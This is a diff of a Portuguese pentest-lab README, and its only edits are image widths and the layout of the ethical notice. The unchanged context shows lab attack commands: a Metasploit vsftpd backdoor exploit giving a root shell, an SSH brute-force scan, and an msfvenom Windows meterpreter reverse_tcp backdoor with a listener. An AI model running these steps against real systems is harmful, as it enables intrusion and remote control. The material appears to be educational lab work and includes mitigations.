@@ -47,7 +47,7 @@ search vsftpd
 ```
  Etapa 1: msfconsole | Etapa 2: search vsftpd |
 |:---:|:---:|
-| <img src="ftp/msfconsole.png" width="400px"><br><sup>Terminal com comando *msfconsole*.</sup> | <img src="ftp/vsftpd1.png" width="400px"><br><sup>Terminal com comando *search vsftpd*.</sup> |
+| <img src="ftp/msfconsole.png" width="500px"><br><sup>Terminal com comando *msfconsole*.</sup> | <img src="ftp/vsftpd1.png" width="500px"><br><sup>Terminal com comando *search vsftpd*.</sup> |
 
 ### 1.2- Configuração do Módulo:
 
@@ -59,7 +59,7 @@ set payload payload/cmd/unix/interact
 ```
 Etapa 3: Exploit | Etapa 4: payload |
 |:---:|:---:|
-| <img src="ftp/vsftpd3.png" width="400px"><br><sup>Terminal com comando *exploit*.</sup> | <img src="ftp/payloads.png" width="400px"><br><sup>Terminal com comando *payload*.</sup> |
+| <img src="ftp/vsftpd3.png" width="500px"><br><sup>Terminal com comando *exploit*.</sup> | <img src="ftp/payloads.png" width="500px"><br><sup>Terminal com comando *payload*.</sup> |
 
 ### 1.3- Exploração e Ganho de Acesso
 
@@ -69,7 +69,7 @@ exploit
 ```
 Etapa 5: Exploit | 
 |:---:|
-| <img src="ftp/exploit.png" width="400px"><br><sup>Terminal com comando *exploit*.</sup> |
+| <img src="ftp/exploit.png" width="800px"><br><sup>Terminal com comando *exploit*.</sup> |
 
 **Resultado:** Uma sessão de comando foi aberta com privilégios de UID: 0 (root).
 
@@ -83,7 +83,7 @@ cat flag.txt
 ```
 Etapa 5: Prova | 
 |:---:|
-| <img src="ftp/bonus may.png" width="400px"><br><sup>Terminal com mensagem final.</sup> |
+| <img src="ftp/bonus may.png" width="800px"><br><sup>Terminal com mensagem final.</sup> |
 
 🔒 **Medidas de Mitigação:**
 
@@ -194,7 +194,7 @@ echo -e 'test\npassword\nmsfadmin' > password.txt
 ```
 Etapa 1: Wordlists | 
 |:---:|
-| <img src="ssh/wordlist4.png" width="400px"><br><sup>Criação de **Wordlists**.</sup> |
+| <img src="ssh/wordlist4.png" width="800px"><br><sup>Criação de **Wordlists**.</sup> |
 
 ### 3.2- Configuração do Scanner:
 
@@ -208,7 +208,7 @@ set PASS_FILE ~/password.txt
 ```
 Etapa 2: Scanner |
 |:---:|
-| <img src="ssh/ssh_login3.png" width="400px"><br><sup>Terminal com comando *rhosts*.</sup> | 
+| <img src="ssh/ssh_login3.png" width="800px"><br><sup>Terminal com comando *rhosts*.</sup> | 
 
 ### 3.3- Execução e Sucesso:
 
@@ -218,7 +218,7 @@ exploit
 ```
 Etapa de Sucesso: credencial encontrada |
 |:---:|
-| <img src="ssh/exploit5.png" width="400px"><br><sup>Terminal com comando *exploit*.</sup> | 
+| <img src="ssh/exploit5.png" width="800px"><br><sup>Terminal com comando *exploit*.</sup> | 
 
 ### 3.4- Interação com o Alvo (Pós-Exploração):
 
@@ -230,7 +230,7 @@ ip addr
 ```
 Etapa final: confirmação de acesso |
 |:---:|
-| <img src="ssh/sucesso.png" width="400px"><br><sup>Terminal com comando *ip addr*.</sup> | 
+| <img src="ssh/sucesso.png" width="800px"><br><sup>Terminal com comando *ip addr*.</sup> | 
 
 **Resultado:** Acesso total ao terminal do servidor alvo, permitindo a execução de qualquer comando remoto.
 
@@ -284,7 +284,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHO
 ```
 Etapa 1  : Gerando arquivo |
 |:---:|
-| <img src="backdoor_executavel/virus2.png" width="400px"><br><sup>Terminal com comando *msfvenom*.</sup> | 
+| <img src="backdoor_executavel/virus2.png" width="800px"><br><sup>Terminal com comando *msfvenom*.</sup> | 
 
 ### 4.2- Distribuição via Servidor Local:
 
@@ -295,7 +295,7 @@ sudo service apache2 start
 ```
 Etapa 2  : Organizando ambiente |
 |:---:|
-| <img src="backdoor_executavel/web4.png" width="400px"><br><sup>Terminal e web Windows.</sup> | 
+| <img src="backdoor_executavel/web4.png" width="800px"><br><sup>Terminal e web Windows.</sup> | 
 
 ### 4.3- Configuração do Listener (Ouvinte):
 
@@ -309,7 +309,7 @@ run
 ```
 Etapa 3  : Configurando listener |
 |:---:|
-| <img src="backdoor_executavel/exploit6.png" width="400px"><br><sup>Terminal kali e Windows.</sup> | 
+| <img src="backdoor_executavel/exploit6.png" width="800px"><br><sup>Terminal kali e Windows.</sup> | 
 
 ### 4.4- Exploração e Pós-Exploração:
 
@@ -323,7 +323,7 @@ screenshot
 ```
 Etapa 4  : Bônus  |
 |:---:|
-| <img src="backdoor_executavel/bonusshell.png" width="400px"><br><sup>Terminal com mensagem.</sup> | 
+| <img src="backdoor_executavel/bonusshell.png" width="800px"><br><sup>Terminal com mensagem.</sup> | 
 
 🔒 Medidas de Mitigação:
 
@@ -341,6 +341,15 @@ Etapa 4  : Bônus  |
 site para baixar isos:
 https://archive.org
 
+
+
+
+
 ### ⚠️ Aviso Ético
 
-    Este repositório tem fins estritamente educativos. Todos os laboratórios foram realizados em ambientes controlados (máquinas virtuais isoladas) e com o objetivo de entender as ameaças para melhor combatê-las. Não utilize essas técnicas para fins maliciosos.
+ Este repositório tem fins estritamente educativos. Todos os laboratórios 
+ foram realizados em ambientes controlados (máquinas virtuais isoladas) e com 
+ o objetivo de entender as ameaças para melhor combatê-las. Não utilize essas 
+ técnicas para fins maliciosos.
+
+ 
